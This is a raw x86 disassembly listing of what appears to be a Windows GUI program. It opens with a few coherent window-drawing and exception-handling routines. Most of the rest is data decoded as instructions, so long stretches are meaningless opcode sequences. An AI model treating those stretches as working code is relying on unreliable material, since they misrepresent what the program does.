mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41a018
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43ade4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ae1f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae26
retn
mov eax [ rw-data ]
call sub_403390
mov eax rw-data
call sub_404120
sub_43ae32
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] cl
inc ebx
add [ edx - 0x51 ] ah
inc ebx
add [ eax ] dl
add al [ eax ]
add [ eax + 0x38 ] ch
inc esp
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
hlt
sub_43bf40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xc0
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x40 ] dh
inc ebx
add [ edx + 0x200043c0 ] ah
add al [ eax ]
add [ ebx + esi + 0x44 ] ch
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xfbe40040
inc ebx
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add al dl
hlt
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax ] cl
hlt
sub_43c9f1
leave
inc ebx
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
xor eax 0xfbe40040
inc ebx
add [ eax ] ch
xor eax [ eax ]
inc esp
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
leave
inc ebx
add [ esi ] al
jae r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
xor eax [ eax ]
or [ edx ] al
inc esp
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
dec esi
outsd
outsb
or al 0x73
jae r-xdata
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax ] cl
add al [ eax + eax - 0x44 ]
loop r-xdata
je r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ eax ] bh
add al [ eax + eax - 0x64 ]
add al [ eax + eax + 0x1c ]
cli
inc ebx
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add al al
cli
inc ebx
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ eax - 0x13ffbc0c ] dh
test [ ebx ] 0xa8
test [ ebx ] 0x54
clc
inc ebx
add [ edi + esi * 8 ] bl
inc ebx
add ah cl
test [ ebx ] 0x80
test [ ebx ] sub_43f7b8
insb
add eax [ eax + eax - 0x38 ]
add eax [ eax + eax + 0x4 ]
add [ edi - 0x45ff7e00 ] al
dec edx
push [ eax + 0x4 ]
inc esp
add [ esp + eax + 0x4ac0044 ] ah
inc esp
add [ esp + eax ] al
inc esp
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
inc ebx
add [ edx + eax ] ch
add [ eax ] al
cmp al 0xbf
outsd
jb r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ edx + ebp * 4 - 0x43afffbc ] ch
sub [ ebx ] dh
insd
dec ebp
insd
outsd
mov eax eax
test al 0xcb
inc ebx
add [ edi ] al
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc eax
jpe r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ esp + eax ] cl
inc esp
outsd
insd
dec ebp
insd
outsd
mov edx cs
inc ebx
add [ eax + 0xc0043c0 ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add al dl
hlt
add [ ebp + edx * 8 + 0x44 ] cl
inc ecx
add [ esp + eax ] cl
inc esp
add [ esp + 0x44 ] dl
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc esp
outsb
je r-xdata
cld
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ eax ] bh
add al [ eax + eax - 0x64 ]
add al [ eax + eax + 0x1c ]
cli
inc ebx
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add al al
cli
inc ebx
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ eax - 0x13ffbc0c ] dh
test [ ebx ] 0xa8
test [ ebx ] 0x54
clc
inc ebx
add [ edi + esi * 8 ] bl
inc ebx
add ah cl
test [ ebx ] 0x80
test [ ebx ] sub_43f7b8
insb
add eax [ eax + eax - 0x38 ]
add eax [ eax + eax + 0x5 ]
push esp
dec ebp
insd
outsd
mov eax eax
adc al 0xcd
inc ebx
add [ edi ] al
add eax 0x6d654d54
outsd
sbb ah cl
inc ebx
add [ ebx + ecx * 8 + r-xdata ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add al dl
hlt
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc ebx
je r-xdata
add [ eax ] cl
add al [ eax + eax - 0x44 ]
loop r-xdata
add [ ebx + esi + 0x40 ] al
insb
or dh [ ebx + 0x73 ]
push esi
jb r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ 0x6c410900 ] cl
imul esp [ edi + 0x6e ] 0x746e656d
mov al [ 0x61004423 ]
add [ eax ] al
add [ eax + 0x1c ] bh
inc esp
add [ ebx ] bl
add bh bh
cwde
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x67696c41
outsb
pushfd
xchg [ ecx ] eax
and al 0x2
add bh bh
and al 0x4
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410900
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x1 ] bh
inc esp
add al dl
fld [ eax + eax - 0x14 ]
loop r-xdata
sbb [ edi ] bh
insb
jae r-xdata
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc esp
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
add bh bh
adc eax 0x6f430500
insb
outsd
insb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
xor al [ eax + eax + 0x63 ]
add [ eax ] eax
inc ecx
add [ ebx + 0x43cc18c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 8 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch cl
inc ebx
add [ eax ] dh
add al [ eax ]
add [ eax - 0x36 ] al
inc ebx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xfbe40040
inc ebx
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
or [ edx ] al
inc esp
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
inc esp
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
and al 0x44
add [ eax + eax ] dh
[ eax - 0x6c ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0016 ] al
outsd
outsb
jae r-xdata
xchg esp eax
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x1 ] bh
inc esp
add al dl
fld [ eax + eax - 0x14 ]
loop r-xdata
insb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
rol [ ebp ] 0xc
add al [ eax ]
jmp esp
mov [ ecx ] al
pop edi
add [ eax ] al
push [ eax ]
add dh bh
test al 0x70
inc esp
add [ eax ] al
adc [ edi ] 0x0
add eax 0x336c7443
inc esp
pushad
sbb al 0x44
jb r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
inc ebx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
ror [ edx + ecx * 8 + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x1b00ffff ] ah
fadd [ eax + eax + 0x8 ]
fld [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050017 ] al
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x43 ] bh
add [ esi + 0x2c0043cb ] dl
add al [ eax ]
add [ edi + edi * 4 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xcb
inc ebx
add [ eax ] al
jb r-xdata
add bh bh
js r-xdata
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + 0x1c ]
inc esp
add [ eax ] al
xor ah 0xff
jb r-xdata
insb
add al 0x51
inc edx
add [ eax ] dh
add bh bh
and al 0x71
inc esp
add [ eax + 0x71 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x15ff0000 ] 0x0
add eax 0x6f6c6f43

inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001f ] al
insd
dec esi
popad
insd
cmp al 0x94
inc ecx
add [ eax ] ah
add al [ eax ]
inc esp
add [ eax + 0x4470 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001c ] al
outsd
outsb
je r-xdata
and al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax + 0x43cb ] ch
lea eax [ bx + si ]
hlt
adc [ eax ] al
adc [ edx ] eax
add bh bh
sbb al 0xf5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x69480d00
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
js r-xdata
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
push ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
or [ gs : edx ] dh
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
sub_43d1fe
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x69560700
jae r-xdata
jb r-xdata
bound ebp [ ebp ]
adc [ eax ] al
daa
add al [ eax ]
jmp [ edi ]
dec edi
push edi
jb r-xdata
add [ eax ] al
js r-xdata
jo r-xdata
add [ eax ] al
dec edi
jbe r-xdata
cwde
push eax
outsd
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f0e0033 ] al
mov [ ecx ] eax
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
pop eax
mov [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
and [ eax + 0x44 ] dl
add [ eax - 0x80000000 ] al
xor al [ eax ]
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070039 ] al
pop eax
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
daa
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
fadd [ eax ]
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a003c ] al
outsb
dec ebx
jns r-xdata
mov [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
push es
dec edi
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942d31a
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
jb r-xdata
daa
inc esp
add [ eax ] cl
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov [ ecx ] eax
sub [ ecx ] al
add bh bh
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
jns r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090038 ] al
outsb
inc ebp
outsb
inc esp
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
and eax 0xd80044
sub al 0x26
inc esp
add al ah
add [ eax ] eax
jmp eax
insd
inc esp
je r-xdata
dec edi
add al 0x25
inc esp
add al ah
add [ eax ] al
jmp eax
loopne r-xdata
outsb
inc ebp
js r-xdata
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003a ] al
and eax 0x1d80044
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or [ edi + 0x6e ] ecx
mov [ ecx ] eax
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
dec ebp
outsd
jne r-xdata
and eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] cl
dec edi
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax - 0x2fffbbfb ] dl
fld [ eax + eax - 0x14 ]
loop r-xdata
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xd638c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xlat
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
xlat
inc ebx
add [ edx ] ah
xlat
inc ebx
add [ edx + eax ] cl
add [ eax ] al
insb
xor eax [ eax + eax + 0x18 ]
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
add [ edi + ebx * 2 + 0x42bc0044 ] dl
inc edx
add [ eax + 0x43 ] dl
insb
inc ebx
inc edx
jb r-xdata
inc esp
add al ch
add [ eax ] eax
jb r-xdata
inc esp
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
aad 0x43
push ebp
jo r-xdata
outsb
push ebx
je r-xdata
arpl [ ebx + 0x50 ] bp
daa
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
inc esp
outsd
ja r-xdata
add ah ah
mov dl 0x44
je r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ edi + eax + 0x44 ] cl
add ah dh
test al 0x44
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add ah dh
add al 0x44
add [ eax + 0x5e ] cl
inc esp
add [ eax + 0x35 ] bh
inc ebp
add [ eax - 0x3fffbb6c ] cl
pop edi
inc esp
add [ esi + ebx * 2 + 0x44 ] bh
add al cl
xor eax 0x35dc0045
inc ebp
add [ esi + ebx * 2 + 0x36040044 ] dh
inc ebp
add [ eax ] dl
pop edi
inc esp
add [ eax + 0x5f300044 ] ch
inc esp
add [ esi + esi ] dl
inc ebp
add [ eax + 0x24004494 ] dl
pushad
inc esp
add [ eax + 0x44 ] ah
add [ eax + 0x5f ] dl
inc esp
add [ eax ] ch
inc ebp
add [ esi + esi ] ch
inc ebp
add [ edi + ebx * 2 + 0x44 ] dh
add ah ah
pop esp
inc esp
add [ ecx ] dl
push esp
inc edx
jne r-xdata
pop ebp
inc esp
jb r-xdata
add [ eax + eax ] ch
add [ eax ] al
cwde
xor [ eax + eax - 0x28 ] al
xor eax 0x35e40040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st5
inc ebx
sub [ eax + eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
push ebx
je r-xdata
jl r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ edx + ebp * 4 - 0x43afffbc ] ch
add [ eax ] ch
in al dx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ esi + eax ] dh
inc esp
add [ eax + 0x6 ] bl
inc esp
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
aam 0x6
inc esp
add [ eax ] ah
pop es
inc esp
add ah ah
add eax 0x62c0044
inc esp
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax - 0x4b ] dl
inc esp
add [ esi + eax + 0x44 ] bl
add al al
xchg edx eax
inc esp
inc edx
add [ ebx + eax * 2 + 0x5dd40042 ] ah
pop edi
inc esp
add [ edx + eax * 2 + 0x43500042 ] bh
lea eax [ bx + si ]
pop esp
aad 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
jb r-xdata
and eax 0xe00044
add bh bh
inc esp
add al bl
add [ eax ] al
add [ eax - 0x4b ] dl
inc esp
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ esi + eax ] dh
inc esp
add [ eax + 0x6 ] bl
inc esp
add [ eax ] dl
or [ eax + eax + 0x8 ] al
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ esi + eax + 0x44 ] bl
add al al
xchg edx eax
inc esp
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
outsd
insb
lea eax [ eax ]
cmp bh dl
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
add [ ebx + eax * 2 ] al
inc edx
add al dl
add al 0x44
add [ eax ] bh
inc ebx
inc edx
add al ch
pop esi
inc esp
add [ ebx + eax * 2 + 0x42 ] ch
inc esp
outsd
dec eax
inc [ eax ]
or [ eax + eax + 0x70 ] eax
or [ eax + eax - 0xc ] eax
or [ eax + eax - 0x14 ] eax
or [ eax + eax + 0x74 ] al
or al [ eax + eax + 0x48 ]
or al [ eax + eax - 0x18 ]
pop es
inc esp
add [ eax + ecx ] cl
inc esp
add [ edi ] al
push esp
inc edx
jne r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ eax - 0xbffbbf8 ] bl
test al 0x44
add ah dl
or [ eax + eax - 0x5c ] al
lodsb [ esi ]
inc esp
add [ eax + 0x600044ac ] ch
stosd [ edi ]
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ eax - 0x44 ] dl
je r-xdata
add dh bh
test al 0x70
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
mov eax eax
rcr al 0x43
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
inc eax
nop
outsd
insb
cmp dh dl
inc ebx
add [ eax ] ah
aaa
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add bh bh
pop eax
xchg esp eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
